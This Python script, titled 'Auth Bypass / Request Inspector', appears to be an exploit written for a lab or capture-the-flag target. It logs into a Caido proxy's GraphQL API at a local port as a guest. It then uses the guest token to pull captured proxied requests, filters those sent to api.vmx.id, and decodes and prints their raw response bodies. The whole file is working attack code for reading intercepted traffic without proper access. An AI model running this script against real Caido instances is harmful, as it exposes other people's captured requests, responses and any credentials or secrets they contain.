import urllib.request, urllib.error
import json
import base64
import sys

CAIDO_BASE = "http://127.0.0.1:32769"
DEFAULT_TIMEOUT = 15


class GraphQLError(Exception):
    """Raised when a GraphQL request fails."""
    def __init__(self, message, status_code=None, response_data=None):
        super().__init__(message)
        self.status_code = status_code
        self.response_data = response_data


def gql(query, token=None, timeout=None):
    """
    Execute a GraphQL query against the Caido SDK.

    Args:
        query: GraphQL query/mutation string.
        token: Optional Bearer token for authentication.
        timeout: Request timeout in seconds (defaults to DEFAULT_TIMEOUT).

    Returns:
        Parsed JSON response dict.

    Raises:
        GraphQLError: On HTTP errors or invalid JSON responses.
        TimeoutError: If the request exceeds the timeout.
        ConnectionError: If the server is unreachable.
    """
    if timeout is None:
        timeout = DEFAULT_TIMEOUT

    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token

    url = CAIDO_BASE + "/graphql"
    payload = json.dumps({"query": query}).encode("utf-8")

    req = urllib.request.Request(url, data=payload, headers=headers, method="POST")

    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        body = r.read().decode("utf-8")
    except urllib.error.HTTPError as e:
        error_body = ""
        try:
            error_body = e.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        raise GraphQLError(
            message=f"HTTP {e.code} on GraphQL request: {e.reason}\nResponse: {error_body[:500]}",
            status_code=e.code,
            response_data=error_body
        )
    except urllib.error.URLError as e:
        raise ConnectionError(
            f"Cannot connect to Caido at {CAIDO_BASE}. Is it running? Detail: {e.reason}"
        )
    except TimeoutError:
        raise TimeoutError(f"GraphQL request timed out after {timeout}s: {query[:100]}...")

    # Parse JSON response
    try:
        resp_data = json.loads(body)
    except json.JSONDecodeError as e:
        raise GraphQLError(f"Invalid JSON from GraphQL endpoint: {e}\nBody: {body[:500]}")

    # Check for GraphQL-level errors
    graphql_errors = resp_data.get("errors")
    if graphql_errors:
        error_msg = json.dumps(graphql_errors, indent=2)
        raise GraphQLError(
            message=f"GraphQL errors returned:\n{error_msg}",
            response_data=resp_data
        )

    return resp_data


def fetch_guest_token():
    """
    Authenticate as a guest and retrieve the access token.

    Returns:
        str: The access token.

    Raises:
        GraphQLError: If login fails or token is missing.
    """
    print("[*] Logging in as guest...")
    try:
        resp = gql("mutation { loginAsGuest { token { accessToken } } }")
    except (GraphQLError, ConnectionError) as e:
        print(f"[!] Failed to login as guest: {e}")
        sys.exit(1)

    # Navigate nested structure safely
    data = resp.get("data")
    if not data:
        print("[!] No 'data' key in response. Full response:")
        print(json.dumps(resp, indent=2))
        sys.exit(1)

    login_as_guest = data.get("loginAsGuest")
    if not login_as_guest:
        print("[!] 'loginAsGuest' not found in response data.")
        print(f"  Available keys: {list(data.keys())}")
        sys.exit(1)

    token_obj = login_as_guest.get("token")
    if not token_obj:
        print("[!] 'token' not found in loginAsGuest response.")
        print(f"  Available keys: {list(login_as_guest.keys())}")
        sys.exit(1)

    access_token = token_obj.get("accessToken")
    if not access_token:
        print("[!] 'accessToken' not found in token object.")
        print(f"  Available keys: {list(token_obj.keys())}")
        sys.exit(1)

    print(f"[+] Guest token acquired successfully.")
    return access_token


def fetch_requests(token, first=100):
    """
    Fetch requests from the Caido proxy.

    Args:
        token: Authentication token.
        first: Number of requests to fetch.

    Returns:
        list: List of request edge objects.
    """
    query = '{requests(first:' + str(first) + '){edges{node{id,method,host,path,response{statusCode,length,raw,contentType}}}}}'
    print(f"[*] Fetching up to {first} requests...")

    try:
        resp = gql(query, token=token)
    except (GraphQLError, ConnectionError) as e:
        print(f"[!] Failed to fetch requests: {e}")
        sys.exit(1)

    edges = resp.get("data", {}).get("requests", {}).get("edges", [])
    print(f"[+] Retrieved {len(edges)} requests.")
    return edges


def parse_response_raw(raw):
    """
    Decode a base64-encoded response string.

    Args:
        raw: Base64-encoded response string.

    Returns:
        str: Decoded response body, or empty string on failure.
    """
    if not raw:
        return ""
    try:
        decoded = base64.b64decode(raw).decode("utf-8", errors="replace")
        return decoded
    except Exception as ex:
        return f"<decode error: {ex}>"


def main():
    print("=" * 60)
    print("  Caido GraphQL SDK — Auth Bypass / Request Inspector")
    print("=" * 60)
    print()

    # Step 1: Get guest token
    token = fetch_guest_token()
    print()

    # Step 2: Fetch requests
    edges = fetch_requests(token)
    print()

    # Step 3: Filter and display api.vmx.id requests
    print("=" * 60)
    print("  === api.vmx.id requests ===")
    print("=" * 60)
    print()

    found = 0
    for e in edges:
        n = e.get("node", {})
        if n.get("host") != "api.vmx.id":
            continue

        found += 1
        resp_data = n.get("response", {})
        raw = resp_data.get("raw", "")
        status = resp_data.get("statusCode", "?")
        path = n.get("path", "?")
        method = n.get("method", "?")
        ct = resp_data.get("contentType", "")
        req_id = n.get("id", "?")

        print(f"[{req_id}] {method} {path} -> {status} (CT: {ct})")

        if raw and status == "200":
            decoded = parse_response_raw(raw)
            if decoded:
                truncated = decoded[:500]
                if len(decoded) > 500:
                    truncated += "..."
                print(f"  Response body:\n{truncated}")
            else:
                print("  Response body: (empty)")
        print("-" * 40)

    if found == 0:
        print("  No requests to api.vmx.id found.")
    else:
        print(f"\n[+] Total api.vmx.id requests: {found}")

    print()
    print("=" * 60)
    print("  Done.")
    print("=" * 60)


if __name__ == "__main__":
    main()
